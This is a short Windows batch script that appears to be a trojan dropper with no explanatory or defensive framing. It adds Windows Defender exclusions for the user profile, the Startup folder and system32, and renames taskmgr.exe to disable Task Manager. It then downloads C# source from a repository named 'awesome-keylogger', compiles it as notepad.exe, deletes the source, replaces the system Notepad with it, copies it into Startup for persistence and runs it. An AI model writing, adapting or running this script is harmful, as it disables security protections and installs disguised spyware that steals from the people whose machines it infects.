@echo off
powershell Add-MpPreference -ExclusionPath %userprofile%
powershell Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
powershell Add-MpPreference -ExclusionPath c:\windows\system32\
ren c:\windows\system32\taskmgr.exe taskmgr.exe.TROJANNED
cd %userprofile%
curl -O https://raw.githubusercontent.com/dGgzajNzdDNy/awesome-keylogger/refs/heads/main/nettrj.cs
c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /target:winexe /out:notepad.exe nettrj.cs
erase nettrj.cs
ren c:\windows\system32\notepad.exe notepad.exe.TROJANNED
copy notepad.exe c:\windows\system32\
copy notepad.exe "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
%userprofile%\notepad.exe
